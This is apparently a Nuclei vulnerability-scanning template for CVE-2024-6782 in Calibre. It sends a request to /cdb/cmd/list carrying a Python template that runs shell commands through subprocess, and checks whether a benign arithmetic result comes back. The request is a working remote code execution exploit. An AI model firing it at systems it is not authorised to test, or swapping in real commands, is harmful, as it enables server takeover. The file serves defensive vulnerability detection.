id: calibre-rce-2024-6782
info:
  name: Calibre Remote Code Execution Vulnerability (CVE-2024-6782)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,CVE-2024-6782
  description: |
    This template detects a Remote Code Execution (RCE) vulnerability in Calibre software (CVE-2024-6782) by sending crafted payloads and verifying the response.

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{rand_int(1000, 10000)}}'
  t3: '{{to_number(t1) + to_number(t2)}}'
  payload: |
    "set /a {{t1}} + {{t2}}"
    "expr {{t1}} + {{t2}}"

http:
  - id: gather-book-ids
    method: GET
    path:
      - /interface-data/books-init
    matchers:
      - type: word
        words:
          - "book_ids"
        part: body
    extractors:
      - type: regex
        name: book_id
        regex:
          - '"book_ids": \[(\d+)\]'
        group: 1

  - id: execute-payload
    method: POST
    path:
      - /cdb/cmd/list
    headers:
      Content-Type: application/json
    body: |
      [
        ["template"],
        "",
        "",
        "",
        1,
        "python:def evaluate(a, b):\n  import subprocess\n  try:\n    return subprocess.check_output(['cmd.exe', '/c', '{{payload}}'])\n  except Exception:\n    return subprocess.check_output(['sh', '-c', '{{payload}}'])\n"
      ]
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "b'{{t3}}"
        part: body
      - type: word
        words:
          - "\"result\":"
        part: body
      - type: word
        words:
          - "TEMPLATE ERROR"
        part: body
      - type: word
        words:
          - "application/json"
        part: header
